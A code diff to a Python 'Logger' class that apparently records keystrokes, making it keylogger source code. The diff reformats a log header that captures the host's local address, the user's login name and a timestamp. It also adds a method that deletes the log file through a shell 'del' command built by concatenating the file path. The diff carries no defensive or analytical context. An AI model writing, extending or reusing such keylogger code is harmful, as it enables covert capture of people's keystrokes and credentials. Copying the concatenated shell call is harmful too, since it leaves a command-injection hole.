@@ -22,11 +22,11 @@ class Logger:
         self.path = path + name
 
         # Creates the log file if it doesn't exist
-        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n\n\n"
-        print(header)
+        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
+        divider = "______________________________________________________\n\n"
         if not os.path.isfile(self.path):
             self.log = open(self.path, 'w')
-            general.append_to_file(self.path, header)
+            general.append_to_file(self.path, header + divider)
 
         # Sets up the thread and starts logging keys on it
         t = threading.Thread(target=self.start)
@@ -50,6 +50,9 @@ class Logger:
         general.append_to_file(self.path, self.buffer)
         self.paused = False
         self.buffer = ''
+
+    def del_log(self):
+    	os.system('del ' + '"' + self.path + '"')
 
     def on_keyboard_event(self, event):
 
